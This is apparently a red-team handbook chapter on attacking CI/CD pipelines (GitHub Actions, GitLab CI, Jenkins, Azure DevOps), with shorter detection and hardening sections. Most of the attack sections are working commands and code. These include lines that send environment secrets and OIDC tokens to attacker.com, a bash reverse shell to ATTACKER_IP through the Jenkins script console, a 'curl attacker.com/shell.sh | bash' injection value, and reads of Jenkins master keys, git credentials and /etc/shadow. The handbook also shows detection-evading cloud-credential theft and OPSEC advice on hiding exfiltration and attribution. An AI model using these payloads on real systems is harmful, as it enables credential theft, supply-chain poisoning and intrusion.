# CI/CD Pipeline Attacks

> **MITRE ATT&CK Mapping**: T1195.002 (Supply Chain Compromise: Software Supply Chain), T1059 (Command and Scripting Interpreter)
> **Tactic**: Initial Access, Execution
> **Platforms**: GitHub Actions, GitLab CI, Jenkins, Azure DevOps, CircleCI, Travis CI
> **Required Permissions**: Varies (contributor to repository, CI/CD admin, or unauthenticated for some supply chain attacks)
> **OPSEC Risk**: Medium-High (pipeline logs, audit trails, artifact registries capture activity)

---

## Strategic Overview

CI/CD pipelines represent one of the most consequential attack surfaces in modern enterprises. These
systems sit at the intersection of source code, secrets management, cloud infrastructure, and
production deployments. A compromised pipeline grants attackers the ability to inject malicious code
into software artifacts, exfiltrate credentials that unlock cloud environments, and establish
persistent access through poisoned build processes. The trust model inherent in CI/CD -- where
automated systems are granted broad permissions to build, test, and deploy -- makes them ideal
targets for both initial access and lateral movement.

The attack surface has expanded dramatically as organizations adopt Infrastructure-as-Code (IaC),
GitOps workflows, and OIDC federation between CI/CD platforms and cloud providers. A single
misconfigured GitHub Actions workflow can expose AWS credentials, a leaked GitLab runner registration
token can provide code execution on internal infrastructure, and a vulnerable Jenkins plugin can
yield domain-wide credential theft. The 2025 tj-actions/changed-files supply chain compromise
(CVE-2025-30066) demonstrated that even widely-trusted third-party actions can become weaponized
attack vectors affecting tens of thousands of repositories simultaneously.

Red team operators should treat CI/CD infrastructure as a primary target during engagements. The
combination of elevated privileges, broad network access, and often-inadequate monitoring makes
pipelines an attractive pivot point from external access to internal infrastructure. Understanding
platform-specific attack techniques across GitHub Actions, GitLab CI, Jenkins, and Azure DevOps is
essential for comprehensive coverage.

## Technical Deep-Dive

### 1. GitHub Actions Exploitation

#### Self-Hosted Runner Abuse

Self-hosted runners execute workflows on organization-controlled infrastructure rather than GitHub's
ephemeral runners. This creates persistent attack opportunities:

```yaml
# Reconnaissance: Identify self-hosted runners in workflow files
runs-on: self-hosted
# or with labels:
runs-on: [self-hosted, linux, gpu]
```

**Persistent access vectors on self-hosted runners:**
- Runner processes typically execute as a service account with broad filesystem access
- The `_work` directory persists between jobs, allowing artifact planting
- Environment variables from previous jobs may leak into subsequent executions
- The runner registration token (stored in `.credentials`) can be extracted for re-registration
- Docker socket access (`/var/run/docker.sock`) enables container escape
- Runner diagnostic logs in `_diag/` may contain sensitive runtime information

**Credential theft from runner environment:**
```bash
# Dump environment variables (secrets are injected as env vars)
env | sort
printenv

# Check for cloud provider metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Docker credential stores
cat ~/.docker/config.json

# Kubernetes configs
cat ~/.kube/config

# Git credentials
cat ~/.git-credentials
git config --list --global
```

**Runner registration token theft:**
```bash
# Token stored on runner filesystem
cat /home/runner/.credentials
cat /home/runner/.credentials_rsaparams

# API endpoint for token generation (requires admin access)
# POST /repos/{owner}/{repo}/actions/runners/registration-token
# POST /orgs/{org}/actions/runners/registration-token
```

#### Workflow Injection via pull_request_target

The `pull_request_target` event is the single most dangerous GitHub Actions trigger. Unlike
`pull_request`, it runs in the context of the *base repository*, not the fork, meaning it has
access to the base repository's secrets:

```yaml
# VULNERABLE: pull_request_target with explicit checkout of PR code
name: Vulnerable Workflow
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code!
      - run: make build  # Executes attacker-controlled Makefile
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}  # Secret exposed to attacker code
```

**Exploitation chain:**
1. Fork the target repository
2. Modify build scripts (Makefile, package.json scripts, setup.py) to exfiltrate secrets
3. Open a pull request -- the `pull_request_target` workflow runs attacker code with base repo secrets
4. Secrets are exfiltrated via DNS, HTTP, or encoded in workflow output

**workflow_run chaining:**
```yaml
# workflow_run triggers after another workflow completes
on:
  workflow_run:
    workflows: ["CI Build"]
    types: [completed]
```
An attacker who can trigger the initial workflow (e.g., via a PR) can chain into `workflow_run`
workflows that may have elevated permissions.

#### GITHUB_TOKEN Scope Abuse

The `GITHUB_TOKEN` is automatically provisioned for every workflow run:

```yaml
# Default permissions (if not restricted at org/repo level)
permissions:
  contents: read     # Can read repo contents
  packages: write    # Can push to GitHub Packages
  actions: read      # Can read workflow details

# Dangerous: write-all permissions
permissions: write-all
```

**Abuse scenarios with GITHUB_TOKEN:**
- Push malicious code to the repository (if `contents: write`)
- Publish poisoned packages to GitHub Packages (if `packages: write`)
- Create/modify releases with trojanized binaries (if `contents: write`)
- Trigger other workflows via API (if `actions: write`)
- Modify branch protection rules (if `administration: write`)

```bash
# Use GITHUB_TOKEN to push malicious commit
git config user.email "bot@github.com"
git config user.name "CI Bot"
git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}
echo "malicious payload" >> backdoor.sh
git add . && git commit -m "chore: update dependencies"
git push origin main
```

#### Secret Extraction Techniques

```yaml
# Method 1: Direct environment variable dump
- run: env | base64 | curl -X POST -d @- https://attacker.com/exfil

# Method 2: Abusing ACTIONS_RUNTIME_TOKEN for artifact access
- run: |
    curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
      "$ACTIONS_RUNTIME_URL/_apis/pipelines/workflows/$GITHUB_RUN_ID/artifacts"

# Method 3: OIDC token theft (if id-token: write permission)
- run: |
    OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
    echo "$OIDC_TOKEN" | curl -X POST -d @- https://attacker.com/oidc

# Method 4: Organization-level secret enumeration via workflow dispatch
- run: |
    echo "ORG_SECRET=${{ secrets.ORG_DEPLOY_KEY }}" >> $GITHUB_OUTPUT
```

#### Actions Cache Poisoning

GitHub Actions caches are shared across branches within a repository:

```yaml
# Legitimate cache usage
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}

# Attack: Poison the cache from a feature branch
# 1. Create branch, modify package-lock.json to match target hash
# 2. Replace cached npm modules with trojanized versions
# 3. Main branch workflows restore the poisoned cache
```

The cache is scoped to the repository but not to specific branches (with some restrictions). An
attacker with write access to any branch can poison caches consumed by builds on `main`.

#### Composite Action Supply Chain (tj-actions/changed-files Case Study -- CVE-2025-30066)

On March 14, 2025, the widely-used GitHub Action `tj-actions/changed-files` (used by over 23,000
repositories) was compromised in a sophisticated supply chain attack:

**Attack timeline:**
1. Attacker compromised a maintainer's Personal Access Token (PAT)
2. All version tags (v1 through v45.0.7) were redirected to malicious commit `0e58ed8`
3. The injected code dumped CI runner memory containing workflow secrets
4. Secrets were written to GitHub Actions logs (publicly visible for public repositories)
5. Exfiltrated data included AWS keys, GitHub PATs, npm tokens, and RSA private keys

**Malicious payload (simplified):**
```python
# The injected code read /proc/self/mem to dump process memory
# Then extracted secrets and wrote them to workflow logs
import os, re
with open('/proc/self/mem', 'rb') as f:
    data = f.read()
    secrets = re.findall(b'[A-Za-z0-9+/=]{40,}', data)
    for s in secrets:
        print(s.decode(errors='ignore'))  # Written to public CI logs
```

**Scope of impact:**
- ~23,000+ repositories affected
- Coinbase was notably impacted, with ~70,000 customer records compromised
- All secrets used in workflows between March 12-15, 2025 should be considered compromised

**Defensive takeaway:** Always pin actions to full commit SHAs, not mutable tags:
```yaml
# VULNERABLE: Tag reference (mutable)
- uses: tj-actions/changed-files@v45

# SECURE: SHA-pinned reference (immutable)
- uses: tj-actions/changed-files@abc123def456789...
```

The related CVE-2025-30154 (reviewdog/action-setup) was part of the same campaign and affected
additional repositories.

### 2. GitLab CI Exploitation

#### Shared/Group/Specific Runner Abuse

GitLab runners come in three scopes, each with different attack implications:

| Runner Type | Scope | Risk Level | Attack Scenario |
|-------------|-------|------------|-----------------|
| Shared | Instance-wide | Critical | Any project can execute on shared infrastructure |
| Group | Group-level | High | Cross-project access within group |
| Specific | Project-level | Medium | Limited to single project |

**Shared runner exploitation:**
```yaml
# .gitlab-ci.yml -- Execute on shared runner
stages:
  - exploit

dump_secrets:
  stage: exploit
  tags:
    - shared
  script:
    - env | sort  # Dump all CI/CD variables
    - cat /etc/hosts  # Network reconnaissance
    - curl -s http://169.254.169.254/  # Cloud metadata
    - ls -la /builds/  # Cross-project artifact access
    - cat /home/gitlab-runner/.bash_history  # Runner history
```

**CVE-2025-11702 -- Runner Hijacking Flaw (CVSS 8.5):**
An improper access control vulnerability in the GitLab runner API allows an authenticated user to
hijack project runners from other projects within the same instance. Exploitation enables:
- Intercepting CI/CD secrets from other projects
- Injecting malicious code into other projects' pipelines
- Gaining access to build infrastructure and deployment credentials

#### CI/CD Variable Extraction

```yaml
# Extract variables defined at project/group/instance level
extract_vars:
  script:
    - printenv | grep -i "CI_\|TOKEN\|KEY\|SECRET\|PASSWORD\|CREDENTIAL"
    - echo "$CI_JOB_TOKEN"  # Limited-scope token for API access
    - echo "$CI_REGISTRY_PASSWORD"  # Container registry credentials
    # Protected variables only available on protected branches
    - echo "$DEPLOY_KEY"  # May require protected branch access
```

**Pipeline trigger token abuse:**
```bash
# If trigger tokens are discovered, pipelines can be triggered externally
curl -X POST \
  -F "token=TOKEN_VALUE" \
  -F "ref=main" \
  -F "variables[MALICIOUS_VAR]=payload" \
  https://gitlab.example.com/api/v4/projects/1/trigger/pipeline
```

#### Include Directive Injection

```yaml
# GitLab CI supports including external YAML
include:
  - remote: 'https://attacker.com/malicious-pipeline.yml'
  - project: 'shared-configs/ci-templates'
    file: '/templates/build.yml'

# If an attacker controls the included repository or URL,
# they can inject arbitrary pipeline stages
```

#### Registry Credential Theft

```bash
# GitLab Container Registry credentials are auto-injected
echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin $CI_REGISTRY

# These credentials can push/pull images across the instance
# Attacker can push trojanized images to legitimate project registries
docker pull $CI_REGISTRY/legitimate-project/app:latest
# Modify and push back
docker push $CI_REGISTRY/legitimate-project/app:latest
```

#### Protected Branches Bypass

```bash
# Protected branches restrict who can push/merge and which variables are available
# Bypass via:
# 1. Merge request with approval from compromised reviewer account
# 2. Force push if the branch protection allows maintainers
# 3. API-based merge bypassing UI protections
# 4. Tag protection gaps (create protected tag to access protected variables)

# Using GitLab API to merge without UI approval checks
curl --request PUT \
  --header "PRIVATE-TOKEN: $STOLEN_TOKEN" \
  "https://gitlab.example.com/api/v4/projects/1/merge_requests/1/merge"
```

### 3. Jenkins Exploitation

#### Groovy Script Console RCE (/script)

The Jenkins Script Console is the most direct path to remote code execution:

```groovy
// Access: /script or /computer/(node-name)/script
// Requires: Overall/Administer permission (or agent-level access)

// Execute OS commands
def cmd = "whoami".execute()
println cmd.text

// Reverse shell
def proc = ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()

// Read sensitive files
new File("/var/jenkins_home/credentials.xml").text
new File("/var/jenkins_home/secrets/master.key").text
new File("/var/jenkins_home/secrets/hudson.util.Secret").text

// Enumerate all credentials
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials

def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class,
    Jenkins.instance, null, null
)
creds.each { c ->
    println("ID: ${c.id}, User: ${c.username}, Pass: ${c.password}")
}
```

#### Groovy Script Console for Cloud Credential Harvesting

When a Jenkins controller runs on an AWS EC2 instance with an attached IAM role, the Groovy
script console can query the IMDS metadata endpoint directly using native Java/Groovy HTTP
classes -- **without spawning a subprocess**. This avoids triggering alerts on `cmd.exe` or
`bash` child processes from Jenkins:

```groovy
// Query AWS IMDS from Jenkins Groovy console without spawning subprocesses
// No "whoami".execute() needed -- pure Groovy HTTP request

// Step 1: Discover available IAM role
def roleUrl = new URL("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
def roleName = roleUrl.text.trim()
println "IAM Role: ${roleName}"

// Step 2: Retrieve temporary credentials
def credsUrl = new URL("http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}")
def creds = credsUrl.text
println creds
// Returns: AccessKeyId, SecretAccessKey, Token (STS temporary credentials)

// Step 3: Retrieve instance identity document
def identUrl = new URL("http://169.254.169.254/latest/dynamic/instance-identity/document")
println identUrl.text
// Returns: accountId, region, instanceId, etc.
```

**Why this matters:** Many detection rules focus on Jenkins spawning shell processes
(`bash`, `cmd.exe`, `powershell`). By using Groovy's native `java.net.URL` class to make
HTTP requests to the metadata service, the operator avoids subprocess creation entirely.
The Jenkins process itself makes the HTTP call, which blends with normal Jenkins network
activity. This technique is applicable to any cloud-hosted Jenkins instance (AWS, GCP, Azure)
by targeting the appropriate metadata endpoint.

> **Reference**: watson0x90. Groovy Baby... (Jenkins Script Console).
> https://watson0x90.com/groovy-baby-jenkins-script-console-bc753549e807

#### Pipeline Script Injection (Groovy Sandbox Escape)

Jenkins Pipeline scripts run in a Groovy sandbox, but escapes are regularly discovered:

**CVE-2025-31722 (CVSS 8.8) -- Templating Engine Plugin Sandbox Bypass:**
Attackers with Item/Configure permissions can bypass Groovy sandbox protections in versions <= 2.5.3
of the Templating Engine Plugin, achieving arbitrary code execution on the Jenkins controller.

```groovy
// Classic sandbox escape patterns
@Grab('commons-io:commons-io:2.11.0')
import org.apache.commons.io.FileUtils

// Property-based escape
this.class.classLoader.loadClass('java.lang.Runtime')
    .getMethod('exec', String.class)
    .invoke(
        this.class.classLoader.loadClass('java.lang.Runtime')
            .getMethod('getRuntime')
            .invoke(null),
        'id'
    )
```

#### Credential Store Extraction

Jenkins stores credentials in an encrypted format that can be decrypted with local files:

```bash
# Three files needed for decryption:
# 1. credentials.xml -- encrypted credential data
# 2. master.key -- master encryption key
# 3. hudson.util.Secret -- secondary encryption key

# Default locations:
/var/jenkins_home/credentials.xml
/var/jenkins_home/secrets/master.key
/var/jenkins_home/secrets/hudson.util.Secret

# Additional credential stores:
/var/jenkins_home/jobs/*/config.xml  # Job-level credentials
/var/jenkins_home/nodes/*/config.xml  # Node credentials
```

**Decryption using jenkins-credentials-decryptor:**
```bash
# Using offline decryption tool
python3 jenkins-credentials-decryptor.py \
  -m master.key \
  -s hudson.util.Secret \
  -c credentials.xml

# Or via Script Console
println(hudson.util.Secret.decrypt("{AES128:...encrypted...}"))
```

#### Agent/Slave Compromise

```groovy
// From Jenkins controller, execute on specific agent
node('target-agent') {
    sh '''
        whoami
        hostname
        cat /etc/shadow
        # Pivot to internal network from agent
        nmap -sP 10.0.0.0/24
    '''
}
```

#### 2025 Jenkins Plugin Vulnerabilities

| CVE | Plugin | Impact | CVSS |
|-----|--------|--------|------|
| CVE-2025-31722 | Templating Engine | Groovy sandbox bypass, arbitrary code execution | 8.8 |
| CVE-2025-53652 | Git Parameter | Command injection via unsanitized user input | High |
| CVE-2025-47889 | WSO2 OAuth | Authentication bypass, login as any user | Critical |
| CVE-2025-67640 | Git Client | OS command injection via workspace directory name | High |
| CVE-2025-67641 | Coverage | Stored XSS via javascript: URLs in coverage results | High |
| CVE-2025-67639 | Core | CSRF on login, trick users into attacker session | Low |
| CVE-2025-5115 | Core (Jetty) | DoS via MadeYouReset attack | Medium |
| CVE-2025-59476 | Core | Log forgery via unrestricted characters | Medium |

### 4. Azure DevOps Exploitation

#### Pipeline Variable Extraction

```yaml
# azure-pipelines.yml
steps:
- script: |
    env | sort
    echo "System Access Token: $(System.AccessToken)"
    echo "Service Connection: $(AzureSubscriptionId)"
  displayName: 'Extract Variables'
  env:
    SYSTEM_ACCESSTOKEN: $(System.AccessToken)
```

**Secret variable extraction:**
Azure DevOps marks secret variables but they can still be exfiltrated:
```yaml
steps:
- script: |
    # Secret variables are masked in logs with ***
    # But can be exfiltrated character-by-character
    SECRET="${MY_SECRET}"
    for ((i=0; i<${#SECRET}; i++)); do
      echo "char_$i: $(echo ${SECRET:$i:1} | xxd -p)"
    done
  env:
    MY_SECRET: $(SecretVariable)
```

#### Service Connection Abuse

Service connections in Azure DevOps provide authenticated access to external services:

```yaml
# Enumerate service connections via API
# GET https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints

# Azure Resource Manager service connection
- task: AzureCLI@2
  inputs:
    azureSubscription: 'Production-Azure'  # Service connection name
    scriptType: 'bash'
    scriptLocation: 'inlineScript'
    inlineScript: |
      # Now authenticated as the service principal
      az account show
      az keyvault list
      az keyvault secret list --vault-name production-vault
      az keyvault secret show --vault-name production-vault --name admin-password

      # Enumerate all resources
      az resource list --output table

      # Access Kubernetes clusters
      az aks get-credentials --resource-group rg-prod --name aks-prod
      kubectl get secrets --all-namespaces
```

#### Self-Hosted Agent Compromise

Azure DevOps self-hosted agents run on customer infrastructure:

```bash
# Agent work directory structure
_work/
  _tasks/     # Downloaded task binaries
  _tool/      # Tool cache
  1/          # Pipeline workspace (source code, artifacts)
    s/        # Source directory
    a/        # Artifact staging
    b/        # Binary output

# Credential locations
_work/_tasks/*/credentials.json
~/.azure/  # Azure CLI cached credentials
```

**CVE-2025 Azure DevOps Vulnerabilities:**
- SSRF and CRLF injection in endpointproxy and Service Hooks components enabling data leakage and
  access token theft
- Pipeline job token privilege escalation allowing extended project access
- Zero-click CI/CD vulnerability enabling code execution without user interaction
- Reverse shell via Azure DevOps and GitHub integration on self-hosted agents

#### YAML Pipeline Injection

```yaml
# Template injection via parameters
parameters:
  - name: userInput
    type: string

steps:
  - script: echo ${{ parameters.userInput }}
  # If userInput = "hello; curl attacker.com/shell.sh | bash"
  # The script becomes: echo hello; curl attacker.com/shell.sh | bash
```

#### Azure Artifacts Poisoning

```bash
# Azure Artifacts supports npm, NuGet, Maven, Python, Universal packages
# Upstream source confusion: Azure Artifacts checks upstream (public) registries

# Attack: Publish higher-version package to public npm
npm publish malicious-internal-package --access public
# Azure Artifacts may prefer the higher public version over the internal one

# Feed configuration vulnerability:
# If upstream sources are enabled with "Allow external versions"
# the feed will prefer higher versions from public registries
```

### 5. General CI/CD Attack Techniques

#### Dependency Confusion

Dependency confusion exploits package managers that check both private and public registries:

```bash
# Step 1: Identify internal package names
# Sources: package.json, requirements.txt, pom.xml, .csproj files
# Leaked via: GitHub repos, error messages, job postings, documentation

# Step 2: Register same-name package on public registry with higher version
# npm
npm init --scope=@internal-company
npm version 99.0.0
npm publish

# PyPI
python3 -m twine upload dist/internal_package-99.0.0.tar.gz

# NuGet
dotnet nuget push InternalPackage.99.0.0.nupkg --source https://api.nuget.org/v3/index.json

# Step 3: Wait for CI/CD pipeline to install the malicious package
# Most package managers prefer higher version numbers
```

**2025 developments:**
- 49% of organizations remain vulnerable to dependency confusion (Orca Security research)
- GhostAction campaign (September 2025): Massive supply chain attack affecting 327 GitHub users
  across 817 repositories, exfiltrating 3,325 secrets via HTTP POST
- 633% year-over-year increase in supply chain attacks targeting package registries

#### CI/CD-to-Cloud Pivot via OIDC Federation

OIDC federation allows CI/CD systems to authenticate to cloud providers without static credentials:

```yaml
# GitHub Actions OIDC to AWS
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-arn: arn:aws:iam::123456789012:role/GitHubActionsRole
    aws-region: us-east-1

# Attack: If the IAM trust policy is misconfigured:
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:org-name/*"  // TOO BROAD!
    }
  }
}
# Any repo in the org can assume this role -- fork a repo, run a workflow, get AWS access
```

**Common OIDC misconfigurations:**
- Wildcard repository matching (`repo:org/*` instead of `repo:org/specific-repo:ref:refs/heads/main`)
- Missing branch/environment conditions
- Overly permissive IAM role policies attached to the OIDC role
- No audience validation
- Trust policy allows any GitHub organization (missing `sub` condition entirely)

#### IaC Exploitation

**Terraform state file secrets:**
```bash
# Terraform state files contain plaintext secrets
# Common locations in CI/CD:
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.access_key != null)'

# S3 backend state files:
aws s3 cp s3://terraform-state-bucket/prod/terraform.tfstate .

# Azure Storage backend:
az storage blob download --container-name tfstate --name prod.terraform.tfstate --file tfstate.json
```

**CloudFormation parameter secrets:**
```bash
# CloudFormation parameters may contain secrets
aws cloudformation describe-stacks --stack-name prod-stack --query 'Stacks[].Parameters'
# NoEcho parameters are hidden in console but visible via API with sufficient permissions
```

#### Container Registry Attacks

```bash
# Image tag mutation: Replace legitimate image with trojanized version
# Works because tags are mutable pointers
docker pull registry.example.com/app:latest
# Inject malicious layer
docker build -t registry.example.com/app:latest -f Dockerfile.malicious .
docker push registry.example.com/app:latest

# Layer poisoning: Inject into shared base images
docker pull registry.example.com/base:ubuntu-22.04
# Add reverse shell to entrypoint
docker push registry.example.com/base:ubuntu-22.04
# All images built FROM this base now contain the backdoor
```

## 2025 Techniques

### tj-actions Supply Chain Campaign (March 2025)

The tj-actions/changed-files compromise (CVE-2025-30066) and the related reviewdog/action-setup
compromise (CVE-2025-30154) represent the most significant GitHub Actions supply chain attacks to
date. Key characteristics:

- **Vector**: Compromised maintainer PAT used to rewrite all version tags
- **Payload**: Memory scraping of CI runner process to extract injected secrets
- **Exfiltration**: Secrets written directly to CI logs (no outbound network needed)
- **Scale**: 23,000+ repositories, all version tags (v1 through v45.0.7) poisoned
- **Notable victim**: Coinbase (70,000 customer records compromised)
- **CISA advisory**: Published March 18, 2025, recommending immediate secret rotation

### GhostAction Campaign (September 2025)

GitGuardian discovered a massive supply chain attack injecting malicious workflows into 817
repositories via 327 compromised GitHub accounts. The attack exfiltrated 3,325 secrets including
PyPI tokens, npm tokens, and DockerHub credentials via HTTP POST requests.

### Jenkins CVE-2025-53652 -- Git Parameter Command Injection

An estimated 15,000 Jenkins servers are vulnerable to command injection via the Git Parameter plugin.
User input used directly in commands without sanitization allows arbitrary OS command execution.

### Jenkins CVE-2025-47889 -- WSO2 OAuth Authentication Bypass

The WSO2 OAuth Plugin (version 1.0 and earlier) fails to validate authentication claims, allowing
unauthenticated attackers to log into Jenkins as any user with any password.

### Azure DevOps Zero-Click CI/CD Vulnerability

Legit Security disclosed a zero-click vulnerability in Azure DevOps that enables code execution
without any user interaction, exploiting race conditions in pipeline processing.

### GitLab CVE-2025-11702 -- Runner Hijacking (CVSS 8.5)

An improper access control flaw in the GitLab runner API allows authenticated users to hijack
project runners from other projects, intercepting secrets and injecting malicious code.

### GitLab Runner Research PoC (November 2025)

Published proof-of-concept tooling by Frichetten demonstrates practical exploitation of self-hosted
GitLab runners through token registration and data exfiltration techniques.

## Detection & Defense

### Detection Strategies

**GitHub Actions monitoring:**
```bash
# Monitor for suspicious workflow modifications
# GitHub Audit Log events:
# - workflows.created_workflow_run
# - workflows.completed_workflow_run
# - repo.actions_secret_created
# - org.update_default_repository_permission

# Detect secret exfiltration patterns in logs
# Look for base64-encoded output, hex-encoded characters
# Monitor outbound network connections from runners
```

**Jenkins detection:**
```groovy
// Monitor Script Console access
// Jenkins audit log: /log/all
// Look for:
// - /script endpoint access
// - Credential enumeration API calls
// - Unusual agent connections
// - Build configuration changes
```

**General CI/CD monitoring signals:**
- Unexpected workflow/pipeline modifications
- Builds triggered from unusual branches or forks
- Environment variable access patterns deviating from baseline
- Outbound network connections from build infrastructure to unknown destinations
- New runner registrations
- Changes to pipeline variable groups or secret scopes
- Build artifact size anomalies (exfiltrated data in artifacts)

### Hardening Recommendations

**GitHub Actions:**
```yaml
# 1. Pin all actions to full SHA
- uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29

# 2. Restrict GITHUB_TOKEN permissions
permissions:
  contents: read
  # Only grant what is needed

# 3. Use environments with required reviewers for sensitive deployments
jobs:
  deploy:
    environment: production  # Requires approval

# 4. Enable "Require approval for all outside collaborators" on self-hosted runners
# 5. Use ephemeral/just-in-time runners instead of persistent self-hosted runners
# 6. Configure OpenSSF Scorecard and Allstar for automated security checks
```

**Jenkins hardening:**
- Disable Script Console in production (or restrict to specific admin accounts)
- Enable CSRF protection and configure authentication
- Use Role-Based Access Control (RBAC) plugin
- Audit and minimize installed plugins
- Encrypt credentials at rest and rotate regularly
- Network-segment Jenkins controller and agents
- Enable and monitor audit logging

**Dependency confusion prevention:**
```bash
# npm: Use scoped packages and .npmrc configuration
@company:registry=https://npm.company.com/
# Always use --registry flag for internal packages

# pip: Configure pip.conf with --index-url and --extra-index-url
[global]
index-url = https://pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

# NuGet: Configure nuget.config with package source mapping
# Maven: Configure repository mirrors in settings.xml
```

## OPSEC Considerations

- **Log visibility**: CI/CD platforms log all pipeline execution output. Public repositories make
  these logs globally accessible. Use encrypted exfiltration channels rather than printing secrets
  to stdout.
- **Webhook notifications**: Many organizations configure Slack/Teams/email notifications for
  pipeline failures or unusual activity. Failed exploitation attempts generate alerts.
- **Audit trails**: GitHub, GitLab, and Azure DevOps maintain comprehensive audit logs. Org admins
  can review all API calls, permission changes, and secret access.
- **Runner forensics**: Self-hosted runners may have EDR agents, filesystem monitoring, or network
  inspection that detect anomalous behavior during build jobs.
- **IP attribution**: CI/CD API calls are logged with source IP. Use appropriate infrastructure
  to avoid direct attribution.
- **Artifact retention**: Build artifacts and logs are retained for configurable periods (default
  30-90 days). Evidence of exploitation persists beyond the immediate attack window.
- **Branch protection alerts**: Modifying protected branches or bypassing review requirements
  generates notifications to repository administrators.
- **Time correlation**: Pipeline execution times that deviate significantly from historical baselines
  (e.g., a 2-minute build suddenly taking 30 minutes) may trigger investigation.

## Cross-References

- [Credential Access via CI/CD Secrets](../07-credential-access/)
- [Supply Chain Persistence Techniques](../04-persistence/)
- [Cloud Initial Access via OIDC](../13-cloud-security/)
- [Lateral Movement from CI/CD to Production](../09-lateral-movement/)
- [Defense Evasion in Build Pipelines](../06-defense-evasion/)
- [Code Examples for Pipeline Exploitation](../15-code-examples/)

## References

- CISA Advisory: Supply Chain Compromise of tj-actions/changed-files (CVE-2025-30066) and reviewdog/action-setup (CVE-2025-30154) -- https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
- Wiz Blog: GitHub Action tj-actions/changed-files Supply Chain Attack -- https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
- OpenSSF: Maintainers' Guide to Securing CI/CD Pipelines After tj-actions and reviewdog Attacks -- https://openssf.org/blog/2025/06/11/maintainers-guide-securing-ci-cd-pipelines-after-the-tj-actions-and-reviewdog-supply-chain-attacks/
- Jenkins Security Advisory 2025-04-02 (CVE-2025-31722) -- https://www.jenkins.io/security/advisory/2025-04-02/
- Jenkins Security Advisory 2025-12-10 (CVE-2025-67639, CVE-2025-67640, CVE-2025-67641) -- https://www.jenkins.io/security/advisory/2025-12-10/
- Hackread: 15,000 Jenkins Servers at Risk from CVE-2025-53652 -- https://hackread.com/jenkins-servers-risk-rce-vulnerability-cve-2025-53652/
- GitLab Runner Hijacking CVE-2025-11702 -- https://securityonline.info/gitlab-patches-high-runner-hijacking-flaw-cve-2025-11702-and-multiple-dos-vulnerabilities/
- Frichetten: gitlab-runner-research PoC -- https://github.com/Frichetten/gitlab-runner-research
- Legit Security: Azure DevOps Zero-Click CI/CD Vulnerability -- https://www.legitsecurity.com/blog/azure-devops-zero-click-ci/cd-vulnerability
- White Knight Labs: CI/CD Attack Path via Azure DevOps Self-Hosted Agent -- https://whiteknightlabs.com/2025/07/15/ci-cd-attack-path-reverse-shell-via-azure-devops-and-github-integration-on-a-self-hosted-agent/
- Legit Security: RCE in Azure Pipelines Supply Chain -- https://www.legitsecurity.com/blog/remote-code-execution-vulnerability-in-azure-pipelines-can-lead-to-software-supply-chain-attack
- Tinder Security Labs: GitHub Actions OIDC Vulnerabilities -- https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8
- Orca Security: 49% of Organizations Vulnerable to Dependency Confusion -- https://orca.security/resources/blog/dependency-confusion-supply-chain-attacks/
- OWASP MCP Top 10: Software Supply Chain Attacks (MCP04:2025) -- https://owasp.org/www-project-mcp-top-10/2025/MCP04-2025
- Praetorian: CI/CD Offensive Security Training at Black Hat -- https://www.praetorian.com/blog/ci-cd-training-from-the-front-lines-offensive-security-at-black-hat/
- NsecTraining: Attacking & Securing CI/CD Pipeline Course -- https://nsec.io/training/2025-attacking--securing-cicd-pipeline-course/
- Palo Alto Networks: Anatomy of a Cloud Supply Pipeline Attack -- https://www.paloaltonetworks.com/cyberpedia/anatomy-ci-cd-pipeline-attack
- GitProtect.io: DevOps Threats Unwrapped Mid-Year Report 2025 -- https://gitprotect.io/blog/devops-threats-unwrapped-mid-year-report-2025/
- Pulse Security: OMGCICD - Attacking GitLab CI/CD via Shared Runners -- https://pulsesecurity.co.nz/articles/OMGCICD-gitlab
- watson0x90: Groovy Baby... (Jenkins Script Console) -- https://watson0x90.com/groovy-baby-jenkins-script-console-bc753549e807
- risk3sixty: Breaking Into GitLab - Attacking Self-Hosted CI/CD -- https://risk3sixty.com/blog/attacking-self-hosted-gitlab
- MITRE ATT&CK T1195.002: Supply Chain Compromise -- https://attack.mitre.org/techniques/T1195/002/
- MITRE ATT&CK T1059: Command and Scripting Interpreter -- https://attack.mitre.org/techniques/T1059/
